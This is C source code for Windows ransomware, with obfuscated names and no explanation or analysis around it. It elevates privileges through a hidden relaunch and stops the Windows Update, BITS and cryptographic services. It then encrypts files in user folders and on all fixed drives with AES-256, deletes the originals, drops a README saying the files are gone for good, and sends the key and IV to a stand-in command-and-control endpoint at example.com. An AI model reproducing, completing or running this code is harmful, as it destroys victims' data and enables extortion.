#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <conio.h>
#include <time.h>
#include <psapi.h>
#include <tchar.h>
#include <bcrypt.h>
#include <threadpoolapiset.h>
#include <wininet.h>

#define BUF_SIZE 65536

typedef struct {
    char* x1;
    unsigned char x2[32];
    unsigned char x3[16];
} XStruct;

void y1(const char* x4, const unsigned char* x2, const unsigned char* x3);
void y2(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6);
int y3();
void y4();
void y5(unsigned char* x7, size_t x8);
void y6(unsigned char* x2, unsigned char* x3);
void y7(unsigned char* x2, unsigned char* x3);

TP_CALLBACK_ENVIRON tpoolEnv;
PTP_POOL tpool;
PTP_CLEANUP_GROUP tpoolCleanupGroup;

void CALLBACK tpoolCallback(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_WORK work) {
    XStruct* x9 = (XStruct*)context;
    y1(x9->x1, x9->x2, x9->x3);
    SecureZeroMemory(x9->x1, strlen(x9->x1));
    free(x9->x1);
    SecureZeroMemory(x9, sizeof(XStruct));
    free(x9);
}

void initThreadPool() {
    tpool = CreateThreadpool(NULL);
    if (!tpool) {
        printf("tpcf: %d\n", GetLastError());
        exit(1);
    }

    tpoolCleanupGroup = CreateThreadpoolCleanupGroup();
    if (!tpoolCleanupGroup) {
        printf("pf: %d\n", GetLastError());
        CloseThreadpool(tpool);
        exit(1);
    }

    InitializeThreadpoolEnvironment(&tpoolEnv);
    SetThreadpoolCallbackPool(&tpoolEnv, tpool);
    SetThreadpoolCallbackCleanupGroup(&tpoolEnv, tpoolCleanupGroup, NULL);
}

void cleanupThreadPool() {
    CloseThreadpoolCleanupGroupMembers(tpoolCleanupGroup, FALSE, NULL);
    CloseThreadpoolCleanupGroup(tpoolCleanupGroup);
    CloseThreadpool(tpool);
}

int checkAdmin() {
    BOOL isAdmin = FALSE;
    PSID pSID;
    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&SIDAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSID)) {
        CheckTokenMembership(NULL, pSID, &isAdmin);
        FreeSid(pSID);
    }
    return isAdmin;
}

void elevatePrivileges() {
    if (!checkAdmin()) {
        TCHAR szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFO sei = { sizeof(sei) };
            sei.lpVerb = _T("runas");
            sei.lpFile = szPath;
            sei.lpParameters = _T("--foodsum");
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE;

            if (!ShellExecuteEx(&sei)) {
                exit(1);
            }
            exit(0);
        }
    }
}

void stopServices() {
    SC_HANDLE scMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scMgr) {
        const char* services[] = { "wuauserv", "bits", "cryptsvc" };
        for (int i = 0; i < sizeof(services) / sizeof(services[0]); i++) {
            SC_HANDLE svc = OpenService(scMgr, services[i], SERVICE_STOP | SERVICE_QUERY_STATUS);
            if (svc) {
                SERVICE_STATUS svcStatus;
                if (ControlService(svc, SERVICE_CONTROL_STOP, &svcStatus)) {
                    printf("s %s st.\n", services[i]);
                }
                CloseServiceHandle(svc);
            }
        }
        CloseServiceHandle(scMgr);
    }
}

void y1(const char* x4, const unsigned char* x2, const unsigned char* x3) {
    char modPath[MAX_PATH];
    GetModuleFileName(NULL, modPath, MAX_PATH);
    if (strstr(x4, ".exe") || _stricmp(x4, modPath) == 0) {
        return;
    }

    FILE* inFile = fopen(x4, "rb");
    if (!inFile) return;

    char outFilePath[256];
    snprintf(outFilePath, sizeof(outFilePath), "%s.smert", x4);

    FILE* outFile = fopen(outFilePath, "wb");
    if (!outFile) {
        fclose(inFile);
        return;
    }

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        fclose(inFile);
        fclose(outFile);
        return;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }

    if (!CryptHashData(hHash, x2, 32, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }

    CryptDestroyHash(hHash);

    if (!CryptSetKeyParam(hKey, KP_IV, x3, 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }

    unsigned char buf[BUF_SIZE];
    unsigned char encBuf[BUF_SIZE + 16];
    DWORD bytesRead, bytesWritten;

    while ((bytesRead = fread(buf, 1, BUF_SIZE, inFile)) > 0) {
        bytesWritten = bytesRead;
        if (!CryptEncrypt(hKey, 0, feof(inFile), 0, encBuf, &bytesWritten, sizeof(encBuf))) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            fclose(inFile);
            fclose(outFile);
            return;
        }
        fwrite(encBuf, 1, bytesWritten, outFile);
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);

    fclose(inFile);
    fclose(outFile);

    remove(x4);
}

int readmeExists(const char* x5) {
    char rPath[256];
    snprintf(rPath, sizeof(rPath), "%s\\README.txt", x5);
    struct stat buffer;
    return (stat(rPath, &buffer) == 0);
}

void createReadme(const char* x5) {
    if (readmeExists(x5)) {
        return;
    }
    char rPath[256];
    snprintf(rPath, sizeof(rPath), "%s\\README.txt", x5);

    FILE* readme = fopen(rPath, "w");
    if (readme) {
        fprintf(readme, "Your files have been fucked, theres no way back.\nWhat can you do about it?\n Start all over again.");
        fclose(readme);
    }
}

int checkSystemDir(const char* x5) {
    const char* sysDirs[] = {
        "C:\\Windows",
        "C:\\Users\\Default",
        "C:\\Users\\Public",
        NULL
    };

    for (int i = 0; sysDirs[i] != NULL; i++) {
        if (_stricmp(x5, sysDirs[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

int checkMemory() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    if (memStatus.dwMemoryLoad > 80) {
        return 0;
    }

    FILETIME idleTime, kernelTime, userTime;
    if (GetSystemTimes(&idleTime, &kernelTime, &userTime)) {
        static ULARGE_INTEGER prevIdleTime = { 0 };
        static ULARGE_INTEGER prevKernelTime = { 0 };
        static ULARGE_INTEGER prevUserTime = { 0 };

        ULARGE_INTEGER currIdleTime, currKernelTime, currUserTime;

        currIdleTime.LowPart = idleTime.dwLowDateTime;
        currIdleTime.HighPart = idleTime.dwHighDateTime;
        currKernelTime.LowPart = kernelTime.dwLowDateTime;
        currKernelTime.HighPart = kernelTime.dwHighDateTime;
        currUserTime.LowPart = userTime.dwLowDateTime;
        currUserTime.HighPart = userTime.dwHighDateTime;

        ULONGLONG idleDiff = currIdleTime.QuadPart - prevIdleTime.QuadPart;
        ULONGLONG kernelDiff = currKernelTime.QuadPart - prevKernelTime.QuadPart;
        ULONGLONG userDiff = currUserTime.QuadPart - prevUserTime.QuadPart;

        ULONGLONG totalDiff = kernelDiff + userDiff;
        double cpuUsage = (totalDiff - idleDiff) * 100.0 / totalDiff;

        prevIdleTime = currIdleTime;
        prevKernelTime = currKernelTime;
        prevUserTime = currUserTime;

        return cpuUsage < 80;
    }

    return 1;
}

void y2(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6) {
    WIN32_FIND_DATA findData;
    HANDLE hFind;
    char searchPath[512];
    char fullPath[512];

    if (checkSystemDir(x5)) {
        return;
    }

    snprintf(searchPath, sizeof(searchPath), "%s\\*", x5);
    hFind = FindFirstFile(searchPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            snprintf(fullPath, sizeof(fullPath), "%s\\%s", x5, findData.cFileName);

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (x6 < 3) {
                    y2(fullPath, x2, x3, x6 + 1);
                }
            }
            else {
                const char* fileExtension = strrchr(findData.cFileName, '.');
                if (!readmeExists(x5) && (fileExtension == NULL || _stricmp(fileExtension, ".lnk") != 0)) {
                    createReadme(x5);
                }

                XStruct* x9 = (XStruct*)malloc(sizeof(XStruct));
                x9->x1 = _strdup(fullPath);
                memcpy(x9->x2, x2, 32);
                memcpy(x9->x3, x3, 16);

                PTP_WORK work = CreateThreadpoolWork(tpoolCallback, x9, &tpoolEnv);
                if (work) {
                    SubmitThreadpoolWork(work);
                }
                else {
                    SecureZeroMemory(x9->x1, strlen(x9->x1));
                    free(x9->x1);
                    SecureZeroMemory(x9, sizeof(XStruct));
                    free(x9);
                }
            }
        }
    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);
}

void processFiles(const unsigned char* x2, const unsigned char* x3, int x6) {
    KNOWNFOLDERID folders[] = { FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Pictures, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Contacts, FOLDERID_Favorites, FOLDERID_Links, FOLDERID_SavedGames, GUID_NULL };
    PWSTR folderPath;

    for (int i = 0; !IsEqualGUID(&folders[i], &GUID_NULL); i++) {
        if (SHGetKnownFolderPath(&folders[i], 0, NULL, &folderPath) == S_OK) {
            char dirPath[MAX_PATH];
            wcstombs(dirPath, folderPath, MAX_PATH);
            y2(dirPath, x2, x3, x6);
            CoTaskMemFree(folderPath);
        }
    }

    for (char drive = 'A'; drive <= 'Z'; drive++) {
        char rootPath[4] = { drive, ':', '\\', '\0' };
        if (GetDriveType(rootPath) == DRIVE_FIXED) {
            y2(rootPath, x2, x3, x6);
        }
    }
}

void xorEncrypt(unsigned char* x7, size_t x8) {
    for (size_t i = 0; i < x8; i++) {
        x7[i] ^= 0xAA;
    }
}

void sendKeys(const unsigned char* key, const unsigned char* iv) {
    HINTERNET hSession = InternetOpen("TLD12Browser/10.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;

    HINTERNET hConnect = InternetConnect(hSession, "example.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/c2/data", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    char keyHex[65], ivHex[33];
    for (int i = 0; i < 32; ++i) {
        sprintf(&keyHex[i * 2], "%02x", key[i]);
    }
    keyHex[64] = '\0';

    for (int i = 0; i < 16; ++i) {
        sprintf(&ivHex[i * 2], "%02x", iv[i]);
    }
    ivHex[32] = '\0';

    char jsonData[256];
    snprintf(jsonData, sizeof(jsonData), "{\"key\":\"%s\",\"iv\":\"%s\"}", keyHex, ivHex);

    const char* headers = "Content-Type: application/json";
    int retries = 3;
    while (retries--) {
        if (HttpSendRequest(hRequest, headers, (DWORD)strlen(headers), (LPVOID)jsonData, (DWORD)strlen(jsonData))) {
            break;
        }
        Sleep(1000);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}


void generateKeys(unsigned char* x2, unsigned char* x3) {
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, 32, x2);
        CryptGenRandom(hProv, 16, x3);
        CryptReleaseContext(hProv, 0);

        xorEncrypt(x2, 32);
        xorEncrypt(x3, 16);

        sendKeys(x2, x3);
    }
    else {
        exit(1);
    }
}

void decryptKeys(unsigned char* x2, unsigned char* x3) {
    xorEncrypt(x2, 32);
    xorEncrypt(x3, 16);
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        elevatePrivileges();
        ShellExecute(NULL, "open", argv[0], "--foodsum", NULL, SW_HIDE);
        return 0;
    }

    unsigned char x2[32];
    unsigned char x3[16];

    generateKeys(x2, x3);

    stopServices();

    decryptKeys(x2, x3);

    initThreadPool();

    if (strcmp(argv[1], "--foodsum") == 0) {
        processFiles(x2, x3, 0);
    }
    else {
        return 1;
    }

    cleanupThreadPool();

    return 0;
}
